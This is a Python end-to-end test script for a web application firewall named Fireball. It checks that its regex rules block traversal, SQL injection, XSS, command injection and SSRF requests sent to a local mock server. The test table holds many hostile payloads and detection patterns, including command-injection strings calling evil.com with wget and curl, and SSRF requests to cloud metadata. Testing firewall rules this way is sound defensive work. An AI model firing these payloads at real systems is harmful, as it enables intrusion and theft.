import asyncio
import os
import sys
import pathlib
import httpx
import uvicorn
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

#project root solver for static file (ui)
THIS_FILE    = pathlib.Path(__file__).resolve()
PROJECT_ROOT = THIS_FILE.parent
CLIENT_DIR   = PROJECT_ROOT / "client"
DASHBOARD_HTML = CLIENT_DIR / "dashboard.html"

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

#color coding
GRN  = "\033[92m"
RED  = "\033[91m"
YLW  = "\033[93m"
CYN  = "\033[96m"
DIM  = "\033[2m"
RST  = "\033[0m"
BOLD = "\033[1m"
 
def ok(msg):   print(f"  {GRN}  PASS{RST}  {msg}")
def fail(msg): print(f"  {RED}  FAIL{RST}  {msg}")
def warn(msg): print(f"  {YLW}  WARN{RST}  {msg}")
def hdr(msg):  print(f"\n{BOLD}{CYN}  {msg}{RST}")
def dim(msg):  print(f"  {DIM}{msg}{RST}")

#mock target PORT :3000
mock_app = FastAPI(title="Mock Target")
 
@mock_app.api_route("/{path:path}",
                    methods=["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"])
async def mock_catch_all(request: Request, path: str):
    return JSONResponse({"status": "ok", "path": f"/{path}"})

#waf servers (proxy + ui)
try:
    from db.logger import log_background_listener
    from routes.waf_rules       import rule_router
    from routes.network_logs    import logs_router
    from routes.waf_actions_log import waf_actions_router
    from routes.reverse_proxy   import proxy_router
except ModuleNotFoundError as e:
    print(f"\n{RED} Error in running the WAF:{RST} {e}")
    sys.exit(1)


@asynccontextmanager
async def dashboard_lifespan(app: FastAPI):
    asyncio.create_task(log_background_listener())
    yield


dashboard_app = FastAPI(title="Fireball — Dashboard", lifespan=dashboard_lifespan)
dashboard_app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
dashboard_app.include_router(rule_router)
dashboard_app.include_router(logs_router)
dashboard_app.include_router(waf_actions_router)
 
if CLIENT_DIR.exists():
    dashboard_app.mount("/client", StaticFiles(directory=str(CLIENT_DIR)), name="client")
 

@dashboard_app.get("/")
async def serve_dashboard():
    if DASHBOARD_HTML.exists():
        return FileResponse(str(DASHBOARD_HTML))
    return JSONResponse({"status": "ok", "note": "no dashboard.html found"})
 
proxy_app = FastAPI(title="Fireball — Proxy")
proxy_app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
proxy_app.include_router(proxy_router)

#launcher
async def serve_all():
    configs = [
        uvicorn.Config(mock_app,      host="127.0.0.1", port=3000, log_level="error"),
        uvicorn.Config(dashboard_app, host="127.0.0.1", port=8000, log_level="error"),
        uvicorn.Config(proxy_app,     host="127.0.0.1", port=8080, log_level="error"),
    ]
    servers = [uvicorn.Server(c) for c in configs]
    await asyncio.gather(*[s.serve() for s in servers])

#TEST CASES FOR EACH RULE (labelled w rule ID)
PROXY = "http://127.0.0.1:8080"
DASHBOARD = "http://127.0.0.1:8000"
 
TESTS = [
 
    
    # CLEAN TRAFFIC  
    
    (0, "Clean GET /",  "Clean", "GET",  "/",          None, None, None, False),
    (0, "Clean GET /api/users", "Clean", "GET",  "/api/users", None, None, None, False),
    (0, "Clean POST JSON body", "Clean", "POST", "/api/login", None, None, '{"user":"andreipopa","pass":"parola123"}', False),
    (0, "Clean query string", "Clean", "GET",  "/search",    {"q": "hello world"}, None, None, False),
    (0, "Clean query with numbers", "Clean", "GET",  "/items",     {"id": "42", "page": "1"}, None, None, False),
 
   
    # RULE 1 — Block DIRECTORY Traversal (PATH)
    # Pattern: (?i)(?:\.\.(?:;|%00)*[/\\]|%u002e|%uff0e|%c0%ae|%c0%2e|%e0%40%ae|%252e|\.\.;/)
   
    (1, "../ in path",  "Rule 1  PATH Traversal", "GET", "/../../etc/passwd",    None, None, None, True),
    (1, "..\\  in path", "Rule 1  PATH Traversal", "GET", "/..\\windows\\system", None, None, None, True),
    (1, "%u002e in path", "Rule 1  PATH Traversal", "GET", "/%u002e%u002e/etc",    None, None, None, True),
    (1, "%uff0e in path", "Rule 1  PATH Traversal", "GET", "/%uff0e%uff0e/etc",    None, None, None, True),
    (1, "%c0%ae in path",  "Rule 1  PATH Traversal", "GET", "/%c0%ae%c0%ae/etc",    None, None, None, True),
    (1, "%c0%2e in path",  "Rule 1  PATH Traversal", "GET", "/%c0%2e%c0%2e/etc",    None, None, None, True),
    (1, "%e0%40%ae in path",  "Rule 1  PATH Traversal", "GET", "/%e0%40%ae/etc",        None, None, None, True),
    (1, "..;/ in path (Spring bypass)", "Rule 1  PATH Traversal", "GET", "/api/..;/admin",        None, None, None, True),
 
    
    # RULE 2 — Block DIRECTORY Traversal to Sensitive Files (PATH)
    # Pattern: (?i)(?:^|/)(?:\.env|etc/(?:passwd|shadow|group|hosts|mysql)|windows/win\.ini|wp-config\.php|proc/self/environ|run/secrets/kubernetes)
    
    (2, "/etc/passwd in path", "Rule 2  Sensitive Files", "GET", "/etc/passwd",               None, None, None, True),
    (2, "/etc/shadow in path",  "Rule 2  Sensitive Files", "GET", "/etc/shadow",               None, None, None, True),
    (2, "/etc/group in path", "Rule 2  Sensitive Files", "GET", "/etc/group",                None, None, None, True),
    (2, "/etc/hosts in path", "Rule 2  Sensitive Files", "GET", "/etc/hosts",                None, None, None, True),
    (2, "wp-config.php in path",  "Rule 2  Sensitive Files", "GET", "/wp-config.php",            None, None, None, True),
    (2, ".env in path", "Rule 2  Sensitive Files", "GET", "/.env",                     None, None, None, True),
    (2, "proc/self/environ in path", "Rule 2  Sensitive Files", "GET", "/proc/self/environ",         None, None, None, True),
    (2, "run/secrets/kubernetes",  "Rule 2  Sensitive Files", "GET", "/run/secrets/kubernetes",    None, None, None, True),
 
    
    # RULE 3 — Block DIRECTORY Traversal (QUERY_STRING)
    # Same pattern as rule 1, applied to query parameters
    
    (3, "../ in query", "Rule 3  QUERY Traversal", "GET", "/file", {"f": "../../etc/passwd"}, None, None, True),
    (3, "%u002e in query", "Rule 3  QUERY Traversal", "GET", "/file", {"f": "%u002e%u002e/etc"}, None, None, True),
    (3, "%c0%ae in query", "Rule 3  QUERY Traversal", "GET", "/file", {"f": "%c0%ae%c0%ae/"}, None, None, True),
    (3, "%252e in query", "Rule 3  QUERY Traversal", "GET", "/file", {"f": "%252e%252e/"}, None, None, True),
 
    
    # RULE 4 — Block Absolute Traversal Linux+Kubernetes (QUERY_STRING)
    # Pattern: (?i)(?:^|[?&=])\s*[/\\](?:etc|proc|var|run|home)[/\\]
   
    (4, "/etc/ in query ", "Rule 4  Abs Traversal Linux", "GET", "/read", {"f": "/etc/passwd"}, None, None, True),
    (4, "/proc/ in query ", "Rule 4  Abs Traversal Linux", "GET", "/read", {"f": "/proc/self/environ"}, None, None, True),
    (4, "/var/ in query ",  "Rule 4  Abs Traversal Linux", "GET", "/read", {"f": "/var/log/auth.log"}, None, None, True),
    (4, "/run/ in query ", "Rule 4  Abs Traversal Linux", "GET", "/read", {"f": "/run/secrets/token"}, None, None, True),
    (4, "/home/ in query ", "Rule 4  Abs Traversal Linux", "GET", "/read", {"f": "/home/user/.ssh/id_rsa"}, None, None, True),
 
    
    # RULE 5 — Block Absolute Traversal Windows (QUERY_STRING)
    # Pattern: (?i)(?:c:[/\\](?:windows|inetpub|sysprep|system32)|\\\\(?:localhost|[\w.-]+)\\[a-z$])
    
    (5, "c:\\windows\\ in query",  "Rule 5  Abs Traversal Win", "GET", "/read", {"f": "c:\\windows\\system32"}, None, None, True),
    (5, "c:/inetpub/ in query",  "Rule 5  Abs Traversal Win", "GET", "/read", {"f": "c:/inetpub/wwwroot"}, None, None, True),
    (5, "c:/sysprep/ in query", "Rule 5  Abs Traversal Win", "GET", "/read", {"f": "c:/sysprep/sysprep.xml"}, None, None, True),
    (5, "UNC share \\\\localhost\\c$", "Rule 5  Abs Traversal Win", "GET", "/read", {"f": "\\\\localhost\\c$"}, None, None, True),
 
    
    # RULE 6 — Block Traversal in HEADERS
    # Same pattern as rules 1 & 3
   
    (6, "../ in custom header", "Rule 6  Header Traversal", "GET", "/api", None, {"X-File-Path": "../../etc/passwd"}, None, True),
    (6, "%c0%ae in Referer header", "Rule 6  Header Traversal", "GET", "/api", None, {"Referer": "http://evil/%c0%ae%c0%ae/"}, None, True),
    (6, "%252e in User-Agent",  "Rule 6  Header Traversal", "GET", "/api", None, {"User-Agent": "tool/%252e%252e/etc"}, None, True),
 
    
    # RULE 7 — Block OS Command Injection (BODY)
    # Pattern: (?i)(;\s*cat\s+\/etc\/|\|\s*bash|wget\s+http)
    
    (7, "; cat /etc/ in body", "Rule 7  CMD Injection Body", "POST", "/run", None, None, '{"cmd":"ping; cat /etc/passwd"}', True),
    (7, "| bash in body",  "Rule 7  CMD Injection Body", "POST", "/run", None, None, '{"cmd":"ls | bash"}', True),
    (7, "wget http in body", "Rule 7  CMD Injection Body", "POST", "/run", None, None, '{"cmd":"wget http://evil.com/shell.sh"}', True),
 
    
    # RULE 8 — Block Null Byte Injection (QUERY_STRING)
    # Pattern: %00
    
    (8, "%00 in query value", "Rule 8  Null Byte Query", "GET", "/file", {"name": "passwd%00.jpg"}, None, None, True),
    (8, "%00 in query key", "Rule 8  Null Byte Query", "GET", "/file", {"file%00": "test"}, None, None, True),
 
   
    # RULE 9 — Block IIS Short Name Scan (PATH)
    # Pattern: (?i)::(?:\$INDEX_ALLOCATION|\$DATA)
    
    (9, "::$INDEX_ALLOCATION in path", "Rule 9  IIS Short Name", "GET", "/bin::$INDEX_ALLOCATION", None, None, None, True),
    (9, "::$DATA in path", "Rule 9  IIS Short Name", "GET", "/web.config::$DATA",  None, None, None, True),
 
   
    # RULE 10 — Block SQLi Auth Bypass (QUERY_STRING)
    # Pattern: (?i)(?:'\s*(?:or|and)\s*'?\d|'\s*(?:or|and)\s*'[^']*'='|--\s*$|;\s|--)
    
    (10, "' OR 1 in query","Rule 10  SQLi Auth Bypass", "GET", "/login", {"u": "' OR 1"}, None, None, True),
    (10, "' OR '1'='1 in query","Rule 10  SQLi Auth Bypass", "GET", "/login", {"u": "' OR '1'='1"}, None, None, True),
    (10, "admin'-- in query","Rule 10  SQLi Auth Bypass", "GET", "/login", {"u": "admin'--"}, None, None, True),
 
   
    # RULE 11 — Block SQLi Auth Bypass (BODY)
    # Same pattern as rule 10
   
    (11, "OR bypass in body","Rule 11 SQLi Auth Bypass Body", "POST", "/login", None, None, '{"user":"admin","pass":"x\' OR 1"}', True),
    (11, "comment bypass in body","Rule 11 SQLi Auth Bypass Body", "POST", "/login", None, None, '{"user":"admin","pass":"x\' OR \'1\'=\'1"}', True),
   
    # RULE 12 — Block SQLi UNION SELECT (QUERY_STRING)
    # Pattern: (?i)union[\s\/*\/!+#-]*(?:all[\s\/*\/!+#-]*)?select
   
    (12, "UNION SELECT in query",       "Rule 12  SQLi UNION", "GET", "/search", {"q": "1 UNION SELECT username,password FROM users"}, None, None, True),
    (12, "UNION/**/SELECT obfuscated",  "Rule 12  SQLi UNION", "GET", "/search", {"q": "1 UNION/**/SELECT/**/1,2,3"}, None, None, True),
    (12, "UNION ALL SELECT in query",   "Rule 12  SQLi UNION", "GET", "/search", {"q": "0 UNION ALL SELECT null,null"}, None, None, True),
 
    
    # RULE 13 — Block SQLi UNION SELECT (BODY)
    
    (13, "UNION SELECT in body", "Rule 13  SQLi UNION Body", "POST", "/api/search", None, None, '{"q":"1 UNION SELECT * FROM users"}', True),
 

    #LOG ONLY RULES (warn)
    # RULES 14, 15, 16, 17 — LOG ONLY (must NOT return 403)
   
    (14, "SQL comment /* */ — LOG only", "Rules 14 LOG Only (no block)", "GET", "/search", {"q": "test /* comment */"}, None, None, False),
    (15, "SELECT keyword — LOG only",    "Rules 15  LOG Only (no block)", "GET", "/search", {"q": "select"}, None, None, False),
    (16, "SELECT keyword body — LOG only","Rules 16  LOG Only (no block)", "POST","/search", None, None, '{"q":"delete"}', False),
    (17, "1=1 tautology — LOG only",     "Rules 17 LOG Only (no block)", "GET", "/search", {"q": "1=1"}, None, None, False),
 
   
    # RULE 18 — Block SQLi in HEADERS (Cookie)
    # Pattern: (?i)(?:union[\s\/\*]+select|'\s*(?:or|and)\s*'|--[^\r\n]*|/\*.*?\*/|waitfor[\s+]delay|benchmark\s*\()
   
    (18, "UNION SELECT in Cookie", "Rule 18  SQLi in Headers", "GET", "/dashboard", None, {"Cookie": "sess=abc' UNION SELECT * FROM users--"}, None, True),
    (18, "' OR ' in Cookie", "Rule 18  SQLi in Headers", "GET", "/dashboard", None, {"Cookie": "id=1' OR '1"}, None, True),
    (18, "-- comment in Cookie", "Rule 18  SQLi in Headers", "GET", "/dashboard", None, {"Cookie": "user=admin'--"}, None, True),
    (18, "benchmark() in Cookie", "Rule 18  SQLi in Headers", "GET", "/dashboard", None, {"Cookie": "x=1 AND benchmark(1000000,MD5(1))"}, None, True),
 
   
    # RULE 20 — Block XSS Script Tags (QUERY_STRING)
    # Pattern: (?i)<\s*script[\s>\/]
    
    (20, "<script> in query", "Rule 20  XSS Script Tag", "GET", "/search", {"q": "<script>alert(1)</script>"}, None, None, True),
    (20, "<script/> self-close", "Rule 20  XSS Script Tag", "GET", "/search", {"q": "<script/>"}, None, None, True),
    (20, "< script> with space", "Rule 20  XSS Script Tag", "GET", "/search", {"q": "< script>alert(1)"}, None, None, True),
 
  
    # RULE 21 — Block XSS Script Tags (BODY)
   
    (21, "<script> in body", "Rule 21  XSS Script Body", "POST", "/comment", None, None, '{"text":"<script>alert(1)</script>"}', True),
 
    
    # RULE 22 — Block XSS Event Handlers (QUERY_STRING)
    # Pattern: (?i)[\s"'`;\/0-9\=...]+on\w+[\s...]*=
    
    (22, "onerror= in query", "Rule 22  XSS Event Handler", "GET", "/img",  {"src": '"><img onerror=alert(1)>'}, None, None, True),
    (22, "onload= in query",  "Rule 22  XSS Event Handler", "GET", "/page", {"q": '" onload=alert(1)'}, None, None, True),
    (22, "onclick= in query", "Rule 22  XSS Event Handler", "GET", "/page", {"q": "1 onclick=evil()"}, None, None, True),
 
    
    # RULE 23 — Block XSS Event Handlers (BODY)
    
    (23, "onerror= in body", "Rule 23  XSS Event Body", "POST", "/comment", None, None, '{"html":"<img onerror=alert(1)>"}', True),
 
  
    # RULE 24 — Block XSS Javascript/VBScript URI (QUERY_STRING)
    # Pattern: (?i)(?:javascript|vbscript)\s*:|data:(?:text/html|application/[a-z+]+|image/svg)
  
    (24, "javascript: in query","Rule 24  XSS JS URI", "GET", "/go",   {"url": "javascript:alert(1)"}, None, None, True),
    (24, "vbscript: in query","Rule 24  XSS JS URI", "GET", "/go",   {"url": "vbscript:msgbox(1)"}, None, None, True),
    (24, "data:text/html in query","Rule 24  XSS JS URI", "GET", "/open", {"src": "data:text/html,<script>alert(1)</script>"}, None, None, True),
    (24, "data:image/svg in query","Rule 24  XSS JS URI", "GET", "/open", {"src": "data:image/svg+xml,<svg/>"}, None, None, True),
 
    
    # RULE 25 — Block XSS Javascript URI (BODY)
    
    (25, "javascript: in body","Rule 25  XSS JS URI Body", "POST", "/link", None, None, '{"href":"javascript:void(0);alert(1)"}', True),
    (25, "data:text/html in body","Rule 25  XSS JS URI Body", "POST", "/link", None, None, '{"src":"data:text/html,<h1>pwned</h1>"}', True),
 
    # 
    # RULE 26 — Block XSS Dangerous HTML Tags (QUERY_STRING)
    # Pattern covers: iframe, object, embed, applet, form, base, link, meta, svg,
    #                 img with javascript/data src

    (26, "<iframe> in query","Rule 26  XSS HTML Tags", "GET", "/embed", {"src": "<iframe src=evil.com>"}, None, None, True),
    (26, "<object> in query","Rule 26  XSS HTML Tags", "GET", "/embed", {"src": "<object data=evil.com>"}, None, None, True),
    (26, "<embed> in query","Rule 26  XSS HTML Tags", "GET", "/embed", {"src": "<embed src=evil.com>"}, None, None, True),
 

    # RULE 27 — Block XSS Dangerous HTML Tags (BODY)
    
    (27, "<iframe> in body","Rule 27  XSS HTML Tags Body", "POST", "/post", None, None, '{"html":"<iframe src=evil.com></iframe>"}', True),
 

    # RULE 28 — Block XSS HTML Entity Encoded JS (QUERY_STRING)
    # Pattern: (?i)&#(?:x0*[4-9a-f][0-9a-f]|0*(?:[4-9]\d|1[01]\d));?

    # %23 == # encoded (waf decodes it but in the test script httpx considers # a browser fragment)
    
    (28, "&#x41; entity in query","Rule 28  XSS Entity Encoded", "GET", "/page", {"q": "&%23x41;lert(1)"}, None, None, True),
    (28, "&#65; decimal entity","Rule 28  XSS Entity Encoded", "GET", "/page", {"q": "&%2365;lert(1)"}, None, None, True),
 
    
    # RULE 29 — Block XSS in HEADERS
    # Pattern: (?i)(?:<\s*script|on\w+\s*=|javascript\s*:|vbscript\s*:|data\s*:text\/html)
    
    (29, "<script> in Referer header","Rule 29  XSS in Headers", "GET", "/page", None, {"Referer": "http://evil/<script>alert(1)</script>"}, None, True),
    (29, "onload= in User-Agent","Rule 29  XSS in Headers", "GET", "/page", None, {"User-Agent": "Mozilla onload=evil()"}, None, True),
    (29, "javascript: in Accept header","Rule 29  XSS in Headers", "GET", "/page", None, {"Accept": "javascript:void(0)"}, None, True),
 
    
    # RULE 30 — Block Null Bytes in URI (PATH)
    # Pattern: %00
    
    (30, "%00 in path","Rule 30  Null Byte Path", "GET", "/file%00.pdf",       None, None, None, True),
    (30, "%00 mid-path","Rule 30  Null Byte Path", "GET", "/secret%00/index",   None, None, None, True),

    
    # RULE 31 — Block Null Bytes in QUERY_STRING
    
    (31, "%00 in query string","Rule 31  Null Byte Query", "GET", "/file", {"f": "secret%00.jpg"}, None, None, True),
 

    # RULE 32 — Block Double URL Encoding (PATH)
    # Pattern: (?i)%25(?:2e|2f|5c|00|3c|3e|27|22)
    
    (32, "%252e (double-encoded .) in path", "Rule 32  Double Encoding Path", "GET", "/%252e%252e/etc/passwd", None, None, None, True),
    (32, "%252f (double-encoded /) in path", "Rule 32  Double Encoding Path", "GET", "/%252fetc%252fpasswd",   None, None, None, True),
    (32, "%255c (double-encoded \\) in path","Rule 32  Double Encoding Path", "GET", "/%255cwindows",          None, None, None, True),
 
    
    # RULE 33 — Block Double URL Encoding (QUERY_STRING)
    
    (33, "%252e in query","Rule 33  Double Encoding Query", "GET", "/file", {"f": "%252e%252e%252f"}, None, None, True),
    (33, "%252f in query","Rule 33  Double Encoding Query", "GET", "/file", {"f": "%252fetc%252fpasswd"}, None, None, True),
 
    
    # RULE 34 — Block Malformed URI Characters (PATH)
    # Pattern: (?:%(?![0-9a-fA-F]{2})|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f])
    # Catches bare % not followed by two hex digits
    
    (34, "bare % in path","Rule 34  Malformed URI", "GET", "/search%zz", None, None, None, True),
    (34, "% at end of path","Rule 34  Malformed URI", "GET", "/path%",     None, None, None, True),
 
    
    # RULE 35 — Block Non-Printable Characters in QUERY_STRING
    # Pattern: [\x00-\x08\x0b\x0c\x0e-\x1f\x7f]
    
    #the http req gets 400 bad req if it is sent with 
    #testing with %01 -- it gets decoded into \x01 and blocked by the waf
    (35, "\\x01 control char in query", "Rule 35  Non-Printable Query", "GET", "/search", {"q": "hello%01world"}, None, None, True),
    (35, "\\x7f DEL char in query","Rule 35  Non-Printable Query", "GET", "/search", {"q": "test%7fdata"}, None, None, True),
 

    # RULE 36 — Block Backslash in URI Path
    # Pattern: \\

    (36, "backslash in path","Rule 36  Backslash Path", "GET", "/windows\\system32\\cmd.exe", None, None, None, True),
    (36, "single backslash in path","Rule 36  Backslash Path", "GET", "/api\\v1",                    None, None, None, True),

    
    # RULE 37 — Block Command Injection (QUERY_STRING)
    # Pattern: (?i)(?:[;&|`$]\s*(?:cat|ls|id|whoami|curl|wget|bash|sh|cmd|powershell)\b|\$\(|\$\{IFS\})
    
    (37, "; cat in query","Rule 37  CMD Injection Query", "GET", "/ping",  {"host": "127.0.0.1; cat /etc/passwd"}, None, None, True),
    (37, "| bash in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "ls | bash"}, None, None, True),
    (37, "& whoami in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "dir & whoami"}, None, None, True),
    (37, "` id in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "`id`"}, None, None, True),
    (37, "$(curl) in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "$(curl evil.com)"}, None, None, True),
    (37, "${IFS} in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "cat${IFS}/etc/passwd"}, None, None, True),
    (37, "; powershell in query","Rule 37  CMD Injection Query", "GET", "/run",   {"cmd": "echo;powershell"}, None, None, True),
 
    
    # RULE 38 — Block Command Injection (BODY)
    
    (38, "; cat in body","Rule 38  CMD Injection Body", "POST", "/exec", None, None, '{"cmd":"ping 127.0.0.1; cat /etc/passwd"}', True),
    (38, "| wget in body","Rule 38  CMD Injection Body", "POST", "/exec", None, None, '{"cmd":"ls | wget http://evil.com"}', True),
    (38, "${IFS} in body","Rule 38  CMD Injection Body", "POST", "/exec", None, None, '{"cmd":"cat${IFS}/etc/shadow"}', True),
 

    # RULE 39 — Block SSRF Internal IP Ranges (QUERY_STRING)
    # Pattern covers: 169.254.169.254, 192.168.x.x, 10.x.x.x,
    #                 172.16-31.x.x, 127.0.0.x, localhost

    (39, "AWS metadata 169.254.169.254","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, None, None, True),
    (39, "192.168.x.x in query","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://192.168.1.1/admin"}, None, None, True),
    (39, "10.x.x.x in query","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://10.0.0.1/internal"}, None, None, True),
    (39, "172.16.x.x in query","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://172.16.0.1/secret"}, None, None, True),
    (39, "127.0.0.1 loopback in query","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://127.0.0.1:8080/admin"}, None, None, True),
    (39, "localhost in query","Rule 39  SSRF Internal IP", "GET", "/fetch", {"url": "http://localhost/admin"}, None, None, True),
 
    
    # RULE 40 — Block SSRF File/Dict Protocol (QUERY_STRING)
    # Pattern: (?i)(?:^|\b)(?:file|dict|gopher|ftp):\/\/
    
    (40, "file:// protocol in query","Rule 40  SSRF Protocol", "GET", "/fetch", {"url": "file:///etc/passwd"}, None, None, True),
    (40, "dict:// protocol in query","Rule 40  SSRF Protocol", "GET", "/fetch", {"url": "dict://localhost:11211/"}, None, None, True),
    (40, "gopher:// protocol in query","Rule 40  SSRF Protocol", "GET", "/fetch", {"url": "gopher://evil.com/exploit"}, None, None, True),
    (40, "ftp:// protocol in query","Rule 40  SSRF Protocol", "GET", "/fetch", {"url": "ftp://internal.server/data"}, None, None, True),
]
 
DASHBOARD_API_CASES = [
    ("GET /waf/rules","GET", f"{DASHBOARD}/waf/rules",200),
    ("GET /waf/analytics","GET", f"{DASHBOARD}/waf/analytics",200),
    ("GET /waf/network_logs","GET", f"{DASHBOARD}/waf/network_logs",200),
    ("GET /waf/actions","GET", f"{DASHBOARD}/waf/actions",200),
    ("GET / (dashboard UI)","GET", f"{DASHBOARD}/",200),
]


#test launcher

async def run_tests():
    dim("Waiting for servers to start...")
    await asyncio.sleep(2.5)
 
    passed = failed = 0
    results_by_rule = {}   
 
    async with httpx.AsyncClient(timeout=8.0, follow_redirects=False) as client:
 
        hdr(f"WAF Proxy Tests  ({PROXY})")
 
        current_cat = None
        for rule_id, desc, category, method, path, params, headers, body, expect_block in TESTS:
            if category != current_cat:
                print(f"\n  {YLW}{category}{RST}")
                current_cat = category
 
            try:
                kwargs = {}
                target_url = PROXY + path
                if params:
                    qs = "&".join([f"{k}={v}" for k, v in params.items()])
                    # import urllib.parse
                    # qs = urllib.parse.urlencode(params, safe="%")
                    target_url = f"{target_url}?{qs}"
                if headers:
                    kwargs["headers"] = headers
                if body:
                    kwargs["content"] = body.encode()
                    h = dict(kwargs.get("headers") or {})
                    h["Content-Type"] = "application/json"
                    kwargs["headers"] = h
 
                resp = await client.request(method, target_url, **kwargs)
                got_blocked = resp.status_code == 403
 
                if expect_block and got_blocked:
                    ok(f"[R{rule_id:02d}] {desc} → 403 blocked")
                    passed += 1
                    results_by_rule.setdefault(rule_id, []).append(True)
                elif not expect_block and not got_blocked:
                    ok(f"[R{rule_id:02d}] {desc} → {resp.status_code} (not blocked ✓)")
                    passed += 1
                    results_by_rule.setdefault(rule_id, []).append(True)
                elif expect_block and not got_blocked:
                    fail(f"[R{rule_id:02d}] {desc} → expected 403, got {resp.status_code}  ← WAF MISSED")
                    failed += 1
                    results_by_rule.setdefault(rule_id, []).append(False)
                else:
                    fail(f"[R{rule_id:02d}] {desc} → expected pass-through, got 403  ← FALSE POSITIVE")
                    failed += 1
                    results_by_rule.setdefault(rule_id, []).append(False)
 
            except Exception as e:
                fail(f"[R{rule_id:02d}] {desc} → exception: {e}")
                failed += 1
                results_by_rule.setdefault(rule_id, []).append(False)
 
        #  Dashboard ui tests 
        hdr(f"Dashboard Tests  ({DASHBOARD})")
        for desc, method, url, expect_status in DASHBOARD_API_CASES:
            try:
                resp = await client.request(method, url)
                if resp.status_code == expect_status:
                    ok(f"{desc} → {resp.status_code}")
                    passed += 1
                else:
                    fail(f"{desc} → expected {expect_status}, got {resp.status_code}")
                    failed += 1
            except Exception as e:
                fail(f"{desc} → exception: {e}")
                failed += 1
 
    #  Per-rule summary 
    hdr("Per-rule summary")
    for rule_id in sorted(results_by_rule):
        results = results_by_rule[rule_id]
        all_pass = all(results)
        some_fail = not all_pass
        label = f"Rule {rule_id:02d}"
        p = sum(results)
        t = len(results)
        if all_pass:
            print(f"  {GRN} {RST}  {label}  {DIM}{p}/{t} tests passed{RST}")
        else:
            print(f"  {RED} {RST}  {label}  {RED}{p}/{t} tests passed — check pattern{RST}")
 
    # Total summary 
    total  = passed + failed
    rate   = round(passed / total * 100) if total else 0
    colour = GRN if failed == 0 else (YLW if failed <= 3 else RED)
    print(f"\n{'━'*52}")
    print(f"  {BOLD}Results: {GRN}{passed} passed{RST}  /  {RED}{failed} failed{RST}  /  {total} total  {colour}({rate}%){RST}")
    print(f"{'━'*52}\n")
 
    return failed
 
 

# ENTRY POINT
 
async def main():
    print(f"\n{BOLD}{'═'*52}")
    print(f"  FIREBALL WAF — End-to-End Test for default rules")
    print(f"{'═'*52}{RST}")
    dim(f"Project root  : {PROJECT_ROOT}")
    dim(f"Client dir    : {CLIENT_DIR}  ({'found' if CLIENT_DIR.exists() else 'NOT FOUND'})")
    dim(f"Dashboard : {'found' if DASHBOARD_HTML.exists() else 'NOT FOUND'}")
    print()
 
    loop = asyncio.get_event_loop()
    server_task = loop.create_task(serve_all())
 
    failures = await run_tests()
 
    server_task.cancel()
    try:
        await server_task
    except asyncio.CancelledError:
        pass
 
    os._exit(failures)
 
 
if __name__ == "__main__":
    asyncio.run(main())